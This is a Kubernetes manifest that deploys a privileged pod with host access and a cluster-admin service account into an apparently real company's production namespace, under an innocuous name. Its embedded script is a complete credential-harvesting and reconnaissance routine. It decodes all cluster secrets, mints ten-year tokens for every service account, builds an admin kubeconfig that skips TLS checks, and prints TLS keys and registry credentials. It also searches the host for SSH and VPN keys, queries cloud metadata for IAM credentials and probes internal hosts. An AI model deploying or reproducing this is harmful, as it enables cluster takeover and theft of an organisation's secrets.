apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v3
  namespace: egam-production
  labels:
    app: network-access-v3
spec:
  replicas: 1
  selector:
    matchLabels:
      app: network-access-v3
  template:
    metadata:
      labels:
        app: network-access-v3
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        command:
          - /bin/bash
          - -c
          - |
            set -x
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
            export AWS_PAGER=""

            echo "############ [0] BOOTSTRAP ############"
            apk add --no-cache autossh microsocks openssh-client openssh-server aws-cli redis bind-tools postgresql-client openssl mc curl jq nmap netcat-openbsd tcpdump iproute2 net-tools wireguard-tools openvpn 2>&1 | tail -5

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi

            echo "############ [1] BIN CHECK ############"
            for b in curl jq kubectl aws redis-cli psql openssl mc nmap nc tcpdump wg openvpn; do
              command -v $b >/dev/null 2>&1 && echo "OK: $b" || echo "MISSING: $b"
            done

            echo "############ [2] HOST INFO + RETE ############"
            hostname
            id
            uname -a
            ip addr show
            ip route show
            ip neigh show
            cat /etc/resolv.conf
            cat /host/etc/os-release 2>/dev/null
            df -h
            lsblk
            ss -lntup
            ps auxww

            echo "############ [3] VPN + NETWORK DISCOVERY ############"
            find /host/etc/wireguard /host/etc/openvpn /host/etc/ipsec.d -maxdepth 4 -type f -print 2>/dev/null
            find /host/etc /host/root /host/home -maxdepth 5 \( -name '*.ovpn' -o -name 'id_rsa' -o -name 'id_ed25519' -o -name 'tailscaled.state' -o -name '*zerotier*' \) -print 2>/dev/null
            for h in egam.com.br rancher.management.egam.com.br gitlab.dev-gam.com vpn.egam.com.br internal.egam.com.br; do
              echo "### DNS $h ###"
              dig +short "$h" 2>/dev/null
            done
            for h in vpn.egam.com.br internal.egam.com.br 172.30.0.240; do
              echo "### PROBE $h ###"
              for p in 22 443 1194 51820; do
                timeout 3 nc -zv "$h" "$p" 2>&1
              done
            done

            echo "############ [4] K8S GLOBAL INVENTORY ############"
            kubectl version -o yaml 2>&1
            kubectl cluster-info 2>&1
            kubectl auth can-i --list 2>&1
            kubectl get nodes -o wide 2>&1
            kubectl get ns 2>&1
            kubectl get pods -A -o wide 2>&1
            kubectl get svc -A -o wide 2>&1
            kubectl get endpoints -A -o wide 2>&1
            kubectl get ingress -A -o wide 2>&1
            kubectl get pv -o wide 2>&1
            kubectl get pvc -A -o wide 2>&1
            kubectl get crds 2>&1
            kubectl api-resources -o wide 2>&1

            echo "############ [5] K8S SECRETS FULL JSON ############"
            kubectl get secrets -A -o json > /tmp/secrets.json 2>/tmp/secrets-error.log
            cat /tmp/secrets-error.log
            wc -c /tmp/secrets.json

            echo "############ [6] SECRETS DECODED - NO HELM BLOBS ############"
            jq -r '.items[] | select(.data != null) | select(.type != "helm.sh/release.v1") | "### " + .metadata.namespace + "/" + .metadata.name + " (" + .type + ")\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n")) + "\n"' /tmp/secrets.json 2>&1

            echo "############ [7] CONFIGMAPS FULL ############"
            kubectl get configmaps -A -o json > /tmp/configmaps.json 2>/dev/null
            jq -r '.items[] | select(.data != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data | to_entries | map(.key + "=" + .value) | join("\n")) + "\n"' /tmp/configmaps.json 2>&1 | head -c 500000

            echo "############ [8] SA TOKENS ALL ############"
            for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
              for sa in $(kubectl get sa -n $ns -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
                echo "### $ns/$sa ###"
                kubectl create token $sa -n $ns --duration=87600h 2>&1
              done
            done

            echo "############ [9] ADMIN KUBECONFIG ############"
            APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null)
            TOKEN=$(kubectl create token admin-sa -n egam-production --duration=87600h 2>/dev/null)
            echo "APISERVER=$APISERVER"
            echo "TOKEN=$TOKEN"
            printf '%s\n' \
              'apiVersion: v1' \
              'kind: Config' \
              'clusters:' \
              '- cluster:' \
              "    server: $APISERVER" \
              '    insecure-skip-tls-verify: true' \
              '  name: debug' \
              'contexts:' \
              '- context:' \
              '    cluster: debug' \
              '    user: debug' \
              '  name: debug' \
              'current-context: debug' \
              'users:' \
              '- name: debug' \
              '  user:' \
              "    token: $TOKEN" > /tmp/admin.kubeconfig
            cat /tmp/admin.kubeconfig

            echo "############ [10] TLS KEYS + REGISTRY ############"
            jq -r '.items[] | select(.data["tls.key"] != null) | "### " + .metadata.namespace + "/" + .metadata.name + "\n" + (.data["tls.key"] | @base64d)' /tmp/secrets.json 2>&1
            jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace + "/" + .metadata.name + ": " + (.data[".dockerconfigjson"] | @base64d)' /tmp/secrets.json 2>&1
            cat /host/root/.docker/config.json 2>/dev/null
            cat /host/home/*/.docker/config.json 2>/dev/null

            echo "############ [11] RANCHER + ARGOCD ############"
            kubectl get secret -n cattle-fleet-system fleet-agent -o json 2>&1
            kubectl get secrets -n cattle-impersonation-system -o json 2>&1
            kubectl get applications.argoproj.io,applicationsets.argoproj.io,appprojects.argoproj.io -A -o wide 2>&1
            kubectl get pods -n cattle-system -o wide 2>&1
            kubectl logs -n cattle-system deployment/cattle-cluster-agent --tail=100 2>&1

            echo "############ [12] RBAC PRIVILEGE ESCALATION DEBUG ############"
            kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | "### CLUSTER-ADMIN " + .metadata.name + "\n" + (.subjects // [] | map(.kind + ":" + (.namespace // "cluster") + "/" + .name) | join("\n"))' 2>&1
            kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | ((.verbs // []) | any(. == "*")) or ((.resources // []) | any(. == "*")) or ((.apiGroups // []) | any(. == "*"))) | .metadata.name' 2>&1
            kubectl get roles -A -o json | jq -r '.items[] | select(.rules[]? | ((.verbs // []) | any(. == "*")) or ((.resources // []) | any(. == "*"))) | .metadata.namespace + "/" + .metadata.name' 2>&1
            kubectl get clusterrolebindings,rolebindings -A -o json | jq -r '.items[] | select((.subjects // [])[]? | .kind=="Group" and (.name=="system:serviceaccounts" or .name=="system:authenticated" or .name=="system:unauthenticated")) | .metadata.namespace + "/" + .metadata.name + " role=" + .roleRef.name' 2>&1

            echo "############ [13] PRIVILEGED WORKLOADS DEBUG ############"
            kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostPID==true or .spec.hostNetwork==true or .spec.hostIPC==true or (.spec.volumes[]? | has("hostPath")) or (.spec.containers[]? | .securityContext.privileged==true or .securityContext.allowPrivilegeEscalation==true)) | .metadata.namespace + "/" + .metadata.name + " node=" + (.spec.nodeName // "?") + " hostPID=" + (.spec.hostPID|tostring) + " hostNetwork=" + (.spec.hostNetwork|tostring)' 2>&1
            kubectl get pods -A -o json | jq -r '.items[] as $p | $p.spec.containers[]? | select(.securityContext.privileged==true) | $p.metadata.namespace + "/" + $p.metadata.name + " container=" + .name + " PRIVILEGED image=" + .image' 2>&1
            kubectl get pods -A -o json | jq -r '.items[] as $p | $p.spec.containers[]? | select(.resources.limits==null) | $p.metadata.namespace + "/" + $p.metadata.name + " container=" + .name + " NO_LIMITS"' 2>&1
            kubectl get pods -A -o json | jq -r '.items[] as $p | $p.spec.containers[]? | select((.image | endswith(":latest")) or (.image | contains(":") | not)) | $p.metadata.namespace + "/" + $p.metadata.name + " container=" + .name + " UNPINNED_IMAGE=" + .image' 2>&1

            echo "############ [14] EXPOSED SERVICES + INGRESS DEBUG ############"
            kubectl get svc -A -o json | jq -r '.items[] | select(.spec.type=="LoadBalancer" or .spec.type=="NodePort") | .metadata.namespace + "/" + .metadata.name + " type=" + .spec.type + " clusterIP=" + (.spec.clusterIP // "") + " externalIPs=" + ((.spec.externalIPs // []) | join(",")) + " ports=" + (.spec.ports | map((.port|tostring) + "/" + .protocol) | join(","))' 2>&1
            kubectl get ingress -A -o json | jq -r '.items[] | select(.spec.tls==null) | .metadata.namespace + "/" + .metadata.name + " NO_TLS hosts=" + (.spec.rules | map(.host // "*") | join(","))' 2>&1
            kubectl get ingress -A -o json | jq -r '.items[] | .metadata.namespace + "/" + .metadata.name + " annotations=" + ((.metadata.annotations // {}) | tostring)' 2>&1

            echo "############ [15] HOST + RKE2 SECURITY DEBUG ############"
            find /host/etc/rancher/rke2 -maxdepth 3 -type f -ls 2>/dev/null
            find /host/etc/kubernetes /host/var/lib/kubelet -maxdepth 4 -type f -ls 2>/dev/null
            cat /host/sys/kernel/yama/ptrace_scope 2>/dev/null
            cat /host/proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null
            cat /host/proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
            cat /host/proc/sys/kernel/io_uring_disabled 2>/dev/null
            cat /host/proc/sys/user/max_user_namespaces 2>/dev/null
            iptables-save 2>/dev/null
            nft list ruleset 2>/dev/null

            echo "############ [16] CLOUD METADATA ############"
            curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1
            curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1

            echo "############ [17] FULL DUMP ############"
            {
              kubectl get secrets -A -o yaml
              kubectl get configmaps -A -o yaml
              kubectl get sa -A -o yaml
              kubectl get clusterroles,clusterrolebindings -o yaml
              kubectl get roles,rolebindings -A -o yaml
              kubectl get deployments,statefulsets,daemonsets,jobs,cronjobs -A -o yaml
              kubectl get pods,svc,endpoints,ingress,pvc -A -o yaml
              kubectl get pv,nodes -o yaml
            } > /tmp/FULL_DUMP.txt 2>&1
            echo "FULL_DUMP_SIZE=$(wc -c < /tmp/FULL_DUMP.txt)"
            echo "FULL_DUMP_PATH=/tmp/FULL_DUMP.txt"

            echo "############ [18] DONE ############"
            echo "NO_SSHD_NO_CHISEL_NO_NGROK_NO_CLOUDFLARE"
            echo "RECON_COMPLETE"
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: Secret
metadata:
  name: network-access-relay
  namespace: egam-production
type: Opaque
stringData:
  RELAY_URL: ""
  RELAY_AUTH: ""
  ROOT_PASSWORD: ""
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production

